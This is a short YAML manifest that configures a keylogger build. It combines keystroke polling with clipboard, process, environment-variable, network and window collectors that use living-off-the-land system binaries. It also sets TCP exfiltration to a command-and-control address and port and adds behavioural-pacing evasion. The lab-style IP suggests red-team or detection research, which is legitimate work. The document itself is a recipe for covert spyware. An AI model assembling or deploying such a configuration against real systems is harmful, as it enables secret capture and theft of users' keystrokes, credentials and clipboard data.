name: keylogger_lolbin_recon
description: Keylogger with LOLBin recon — system binaries for broad intel gathering

core:
  - core/emit_buffer
  - core/run_cmd

collectors:
  - collectors/system_info_api
  - collectors/processes_lolbin
  - collectors/clipboard_lolbin
  - collectors/env_vars_lolbin
  - collectors/netinfo_lolbin
  - collectors/active_windows_lolbin

keylogger: collectors/keylogger_poll

exfil: exfil/tcp_flush
arch: arch/keylogger

resources: true

evasion:
  - evasion/behavioral_pacing

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  FLUSH_INTERVAL_MS: "30000"
  BATCH_DURATION_MS: "30000"
